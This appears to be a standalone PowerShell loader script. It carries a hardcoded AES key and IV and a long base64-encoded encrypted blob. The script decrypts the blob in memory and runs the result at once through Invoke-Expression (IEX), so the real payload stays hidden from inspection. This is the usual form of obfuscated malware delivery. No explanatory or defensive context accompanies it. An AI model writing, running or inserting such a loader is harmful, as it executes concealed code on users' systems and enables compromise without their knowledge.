$key = [System.Text.Encoding]::UTF8.GetBytes("PhantomKey1234567890123456789012")
$iv = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")
$enc = "rZWLNLcpuMnGExephNEDAeqtl3Ef/Xx3oYUihu5cMvV/vDt/3A1b6rauTffGeL7uNyUPkUzngszbz7PqqzZJ0od1AJtQiG+oYOYzvCMFbk2o4bxvE9tQfJvZ5zaEc06rDbeMo4tZdkbEOggXAztRzSvf4y8IGD718C1/AXUFi8xRyqhhWhl2mS4CiGJJ1duW2SAWTAgT0C2OQmUwrhdD7DDPFG4htSa+WwftAOvrRy/YIeCCT0sLrhuyq9mJez+b9Ky8fHmJS6iz0BCf+SLzhg98HeXlxEtXCC/KvX40YgrZSTHpIQGEaYyL9UNXLggSuslld9uQId/SryA1J7SRseWtG3muFOraN/txhl4TB1UwNfHyLJjObBiazmXCs9pEZNukHkL++NRN5dcjnAuswCeolLPrh2lRJ3YdJbJtEjWN1lGa2BSp5PeW+rNllJsvnFQW65iudaEDeUCkgAWruSz3iOlZaKKJ7DLOZKKif6xLMyLtRJXVhwOK35lq6u5x2L/OBDzrIxLm3djf7Bg2RYh+IgX9dyJ601v4PAl616ENfoL5bgRQ79X3/C41dpAmt58lJehYnh/liiAZivk+n6UKMJjwKI8RztSVaz9+iN2hvTLlHBbvMqq3yM01y4Dcf4x04aU88Ov+EkNKMCcpE0hDoGAv9WsYpaYpeK7CV1oWe0b35jjIv0OPhhtnY0zkHIW56kEk4eLB/kBUOTgAsZ2W74F7XscWENGKh2Nz6ll8bs+7/QKE1y66EnwGwSFwm1Nwy4udLDliGqp3C6L2jmCF+Wy7bdgvs6LZKGXwHZ7K3uqSksKHdtf1le04bmnSNM3JXIBsavDGL1KYVl09fzRHQ5VatjgQLyY/EGtYmhNzA3BckUxmJhrJv+t/tPLBCOTQ+LqZbmGPCoTa0jbG3uA04RIHA8e29j7ydFndhINESdZQPD67RujbRSFKYCaR/VwDqXrHQEkF2a4nI7JB/4Vs8F7czxuo+N3iR72KQJI="
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key; $aes.IV = $iv
$ms = New-Object System.IO.MemoryStream(,[Convert]::FromBase64String($enc))
$cs = New-Object System.Security.Cryptography.CryptoStream($ms, $aes.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Read)
$sr = New-Object System.IO.StreamReader($cs)
$decryptedScript = $sr.ReadToEnd()
$sr.Close();$cs.Close();$ms.Close()
IEX $decryptedScript
